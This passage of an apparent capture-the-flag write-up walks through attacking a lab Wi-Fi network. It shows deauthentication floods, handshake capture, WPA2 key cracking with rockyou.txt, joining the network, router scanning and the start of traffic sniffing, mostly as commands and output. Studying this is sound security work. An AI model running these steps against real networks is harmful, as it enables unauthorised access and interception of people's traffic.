+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# airodump-ng wlan0</span><br><span class="line"></span><br><span class="line"> CH  5 ][ Elapsed: 12 s ][ 2026-01-20 05:17</span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span><br><span class="line"></span><br><span class="line"> F0:9F:C2:A3:F1:A7  -28        7        0    0   6   54        CCMP   PSK  AirTouch-Internet</span><br><span class="line"> 9E:E8:7E:93:1C:6A  -28        7        0    0   6   54        CCMP   PSK  WIFI-JOHN</span><br><span class="line"> 92:04:E2:13:13:3E  -28        9        0    0   9   54   WPA2 CCMP   PSK  MiFibra-24-D4VY</span><br><span class="line"> 3E:96:55:99:A4:BF  -28       20        0    0   3   54        CCMP   PSK  MOVISTAR_FG68</span><br><span class="line"> CA:83:67:D4:6E:C6  -28      130        0    0   1   54        TKIP   PSK  vodafoneFB6N</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line">Quitting...</span><br></pre></td></tr></table></figure></div>
+
+<p><code>AirTouch-Internet</code> is broadcasting on channel 6 with WPA2-PSK. We lock onto the BSSID and start capturing on channel 6 to wait for a 4-way handshake.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# airodump-ng --bssid F0:9F:C2:A3:F1:A7 -c 6 -w /tmp/airtouch-internet wlan0</span><br><span class="line">05:19:58  Created capture file &quot;/tmp/airtouch-internet-02.cap&quot;.</span><br><span class="line"></span><br><span class="line"> CH  6 ][ Elapsed: 24 s ][ 2026-01-20 05:20 ][ WPA handshake: F0:9F:C2:A3:F1:A7</span><br><span class="line"></span><br><span class="line"> BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span><br><span class="line"></span><br><span class="line"> F0:9F:C2:A3:F1:A7  -28   0      283       16    0   6   54        CCMP   PSK  AirTouch-Internet</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line"> F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29    1 - 1      0       20  EAPOL</span><br><span class="line">Quitting...</span><br></pre></td></tr></table></figure></div>
+
+<p>To force a fresh handshake (instead of waiting forever), we kick the connected client with a deauth flood.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">consultant@AirTouch-Consultant:~$ sudo -i</span><br><span class="line">root@AirTouch-Consultant:~# aireplay-ng --deauth 10 -a F0:9F:C2:A3:F1:A7 wlan0</span><br><span class="line">05:20:09  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6</span><br><span class="line">NB: this attack is more effective when targeting</span><br><span class="line">a connected wireless client (-c &lt;client&#x27;s mac&gt;).</span><br><span class="line"></span><br><span class="line">05:20:10  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:10  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:11  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:11  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:11  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:12  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:12  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:13  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:13  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">05:20:14  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">root@AirTouch-Consultant:~#</span><br><span class="line">root@AirTouch-Consultant:~# ls /tmp</span><br><span class="line">airtouch-internet-01.cap            airtouch-internet-01.log.csv     airtouch-internet-02.kismet.netxml</span><br><span class="line">airtouch-internet-01.csv            airtouch-internet-02.cap         airtouch-internet-02.log.csv</span><br><span class="line">airtouch-internet-01.kismet.csv     airtouch-internet-02.csv</span><br><span class="line">airtouch-internet-01.kismet.netxml  airtouch-internet-02.kismet.csv</span><br><span class="line">root@AirTouch-Consultant:~# exit</span><br><span class="line">logout</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Cracking-the-WPA2-PSK-Handshake"><a href="#Cracking-the-WPA2-PSK-Handshake" class="headerlink" title="Cracking the WPA2-PSK Handshake"></a>Cracking the WPA2-PSK Handshake</h2><p>We pull the capture down to Kali and feed it to <code>aircrack-ng</code> with <code>rockyou.txt</code>.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ sshpass -p &#x27;RxBlZhLmOkacNWScmZ6D&#x27; scp -o StrictHostKeyChecking=no consultant@10.129.10.86:/tmp/airtouch-internet-02.cap .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ aircrack-ng airtouch-internet-02.cap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening airtouch-internet-02.cap</span><br><span class="line">Read 2592 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  F0:9F:C2:A3:F1:A7  AirTouch-Internet         WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening airtouch-internet-02.cap</span><br><span class="line">Read 2592 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.7</span><br><span class="line"></span><br><span class="line">      [00:00:02] 21061/10303727 keys tested (8418.88 k/s)</span><br><span class="line"></span><br><span class="line">      Time left: 20 minutes, 21 seconds                          0.20%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ challenge ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0</span><br><span class="line">                       07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E</span><br><span class="line"></span><br><span class="line">      Transient Key  : 20 14 F5 D2 59 BD 4F 4C C6 1E 30 C1 B4 56 87 B4</span><br><span class="line">                       EC 51 01 B6 03 3B 1D 97 B1 20 6B E4 40 23 8F 5B</span><br><span class="line">                       7C C1 43 99 4A 48 50 F8 C1 19 5F 93 BC A9 58 78</span><br><span class="line">                       72 4D 8D A5 DD 6D 44 E5 A4 B5 68 C0 E0 98 A8 C1</span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 99 7E 4F 30 7D 4E 32 77 B6 F4 74 46 08 32 D8 F1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The PSK is <code>challenge</code>.</p>
+<h2 id="Joining-AirTouch-Internet"><a href="#Joining-AirTouch-Internet" class="headerlink" title="Joining AirTouch-Internet"></a>Joining AirTouch-Internet</h2><p>Back on the consultant box, we author a <code>wpa_supplicant</code> configuration for the network and request a DHCP lease on <code>wlan0</code>.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# cat &gt; /tmp/airtouch-internet.conf &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">&gt; network=&#123;</span><br><span class="line">&gt;     ssid=&quot;AirTouch-Internet&quot;</span><br><span class="line">&gt;     psk=&quot;challenge&quot;</span><br><span class="line">&gt;     key_mgmt=WPA-PSK</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; EOF</span><br><span class="line">root@AirTouch-Consultant:~# wpa_supplicant -i wlan0 -c /tmp/airtouch-internet.conf -B</span><br><span class="line">Successfully initialized wpa_supplicant</span><br><span class="line">rfkill: Cannot open RFKILL control device</span><br><span class="line">rfkill: Cannot get wiphy information</span><br><span class="line">root@AirTouch-Consultant:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0@if29: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 9a:57:01:a1:3c:da brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: wlan0: &lt;BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::ff:fe00:0/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: wlan1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">9: wlan2: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">10: wlan3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">11: wlan4: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">12: wlan5: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">13: wlan6: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">root@AirTouch-Consultant:~# curl 192.168.3.0</span><br><span class="line">^C</span><br><span class="line">root@AirTouch-Consultant:~# ^C</span><br><span class="line">root@AirTouch-Consultant:~# curl 192.168.3.1</span><br><span class="line">^C</span><br><span class="line">root@AirTouch-Consultant:~# dhclient wlan0</span><br><span class="line"></span><br><span class="line">root@AirTouch-Consultant:~#</span><br><span class="line">root@AirTouch-Consultant:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0@if29: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 9a:57:01:a1:3c:da brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: wlan0: &lt;BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.3.61/24 brd 192.168.3.255 scope global dynamic wlan0</span><br><span class="line">       valid_lft 86398sec preferred_lft 86398sec</span><br><span class="line">    inet6 fe80::ff:fe00:0/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: wlan1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">9: wlan2: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">10: wlan3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">11: wlan4: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">12: wlan5: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">13: wlan6: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">root@AirTouch-Consultant:~#</span><br></pre></td></tr></table></figure></div>
+
+<p>We pulled <code>192.168.3.61/24</code> from DHCP. Let’s see who else is on this network.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# nmap -sn 192.168.3.0/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-20 05:27 UTC</span><br><span class="line">Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 255 undergoing ARP Ping Scan</span><br><span class="line">ARP Ping Scan Timing: About 21.96% done; ETC: 05:27 (0:00:04 remaining)</span><br><span class="line">Nmap scan report for 192.168.3.1</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)</span><br><span class="line">Nmap scan report for 192.168.3.61</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 26.04 seconds</span><br><span class="line">root@AirTouch-Consultant:~# curl 192.168.3.1</span><br></pre></td></tr></table></figure></div>
+
+<p>The router itself sits at <code>192.168.3.1</code>. A full scan against it reveals an Apache web app for router configuration.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# nmap -A -Pn 192.168.3.1</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-20 05:28 UTC</span><br><span class="line">Nmap scan report for 192.168.3.1</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp open  domain  dnsmasq 2.90</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: dnsmasq-2.90</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">| http-title: WiFi Router Configuration</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/20%OT=22%CT=1%CU=38638%PV=Y%DS=1%DC=D%G=Y%M=F09FC2%T</span><br><span class="line">OS:M=696F129C%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%</span><br><span class="line">OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5</span><br><span class="line">OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=</span><br><span class="line">OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%</span><br><span class="line">OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0</span><br><span class="line">OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S</span><br><span class="line">OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R</span><br><span class="line">OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N</span><br><span class="line">OS:%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.20 ms 192.168.3.1</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The router exposes a <code>WiFi Router Configuration</code> web app on <code>/login.php</code>. Browsing to it gives us the login page.</p>
+<p>![[Pasted image 20260120083110.png]]</p>
+<p>We don’t have credentials yet — but we do have the ability to sniff the wireless segment. Since we know the PSK, every frame we capture can be decrypted by Wireshark. Let’s grab a fresh capture <em>with active client traffic</em> in it.</p>
+<h2 id="Sniffing-Decrypted-Traffic"><a href="#Sniffing-Decrypted-Traffic" class="headerlink" title="Sniffing Decrypted Traffic"></a>Sniffing Decrypted Traffic</h2><p>We start a new capture on <code>wlan1</code> (used in monitor mode) and trigger another deauth so the legitimate client reconnects and starts using the router.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# airodump-ng --bssid F0:9F:C2:A3:F1:A7 -c 6 -w /tmp/airtouch-internet-pls wlan1</span><br><span class="line">06:48:32  Created capture file &quot;/tmp/airtouch-internet-pls-02.cap&quot;.</span><br><span class="line"> CH  6 ][ Elapsed: 1 min ][ 2026-01-20 06:49 ][ WPA handshake: F0:9F:C2:A3:F1:A7</span><br><span class="line"></span><br><span class="line"> BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span><br><span class="line"></span><br><span class="line"> F0:9F:C2:A3:F1:A7  -28 100      799       55    0   6   54        CCMP   PSK  AirTouch-Internet</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line"> F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29   36 -54      0       67  EAPOL</span><br><span class="line">Quitting...</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# sudo ip link set wlan1 down</span><br><span class="line">root@AirTouch-Consultant:~# sudo iw dev wlan1 set type monitor</span><br><span class="line">root@AirTouch-Consultant:~# sudo ip link set wlan1 up</span><br><span class="line">root@AirTouch-Consultant:~# aireplay-ng --deauth 10 -a F0:9F:C2:A3:F1:A7 wlan1</span><br><span class="line">06:48:38  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6</span><br><span class="line">NB: this attack is more effective when targeting</span><br><span class="line">a connected wireless client (-c &lt;client&#x27;s mac&gt;).</span><br><span class="line">06:48:38  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:38  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:39  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:39  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:40  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:40  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:41  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:41  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:42  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:42  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">root@AirTouch-Consultant:~# aireplay-ng --deauth 5 -a F0:9F:C2:A3:F1:A7 wlan1</span><br><span class="line">06:48:56  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6</span><br><span class="line">NB: this attack is more effective when targeting</span><br><span class="line">a connected wireless client (-c &lt;client&#x27;s mac&gt;).</span><br><span class="line">06:48:56  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:57  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:57  Sending DeAuth (code 7) to broadcast -- BSSID: 